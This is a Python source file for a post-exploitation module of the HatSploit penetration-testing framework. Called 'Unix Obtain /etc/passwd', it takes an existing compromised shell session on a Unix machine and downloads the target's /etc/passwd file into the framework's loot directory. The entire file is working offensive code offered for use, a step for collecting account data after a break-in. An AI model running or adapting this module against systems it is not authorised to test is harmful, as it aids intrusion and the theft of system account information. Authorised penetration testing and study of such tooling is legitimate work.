"""
This module requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.loot import Loot
from hatsploit.lib.core.module.basic import *


class HatSploitModule(Module):
    def __init__(self):
        super().__init__({
            'Category': "post",
            'Name': "Unix Obtain /etc/passwd",
            'Module': "post/unix/shell/getpasswd",
            'Authors': [
                "Ivan Nikolskiy (enty8080) - module developer",
            ],
            'Description': "Get current session /etc/passwd file.",
            'Platform': OS_UNIX,
            'Rank': MEDIUM_RANK,
        })

        self.session = SessionOption('SESSION', None, "Session to run on.", True,
                                     platforms=[OS_UNIX],
                                     type='shell')
        self.path = Option('PATH', Loot().specific_loot('passwd'), "Path to save file.", True)

    def run(self):
        self.session.session.download('/etc/passwd', self.path.value)
